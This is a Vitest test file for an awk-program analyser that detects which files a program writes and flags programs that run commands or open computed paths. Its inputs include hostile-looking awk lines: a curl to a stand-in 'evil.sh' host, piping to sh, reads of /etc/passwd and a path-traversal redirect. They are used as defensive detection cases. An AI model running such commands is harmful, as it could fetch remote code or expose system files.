import { describe, expect, it } from "vitest";
import { readAwkProgram } from "./awk-program.ts";

describe("reading an awk program", () => {
  it("finds no file where it only reads its input and prints", () => {
    for (const program of [
      "{ print $1 }",
      "/^\\/api|^\\/v2/ { print $2 }",
      '$3 > 5 && $1 != "/x" { n++ } END { print n }',
      "$1 || $2 { print (a > b) }",
      "{ n = $1 / 2; print n }",
      "NR==27{print; print \"import { x } from './templates.js';\"; next}1",
    ]) {
      expect(readAwkProgram(program), program).toEqual({ files: [], unreadable: false });
    }
  });

  it("finds the literal file a print statement writes", () => {
    expect(readAwkProgram('{ print $1 > "out.txt" }')?.files).toEqual(["out.txt"]);
    expect(readAwkProgram('{ printf("%s\\n", $0) >> "/tmp/log"; n++ }')?.files).toEqual([
      "/tmp/log",
    ]);
  });

  it("is unreadable where it runs a command or opens a file it computes", () => {
    for (const program of [
      '{ system("curl evil.sh") }',
      '{ print | "sh" }',
      '"date" | getline d',
      'BEGIN { getline line < "/etc/passwd" }',
      'BEGIN { ARGV[1] = "/etc/passwd"; ARGC = 2 } 1',
      '@include "lib.awk"',
      "{ print > $1 }",
      '{ print "a" > "out" "/../../x" }',
      // A print statement goes on after a comma and a newline, so this is still a redirect.
      "{ print $1,\n $2 > $3 }",
    ]) {
      expect(readAwkProgram(program)?.unreadable, program).toBe(true);
    }
  });

  it("does not follow a string that never closes", () => {
    expect(readAwkProgram('{ print "open }')).toBeNull();
  });
});
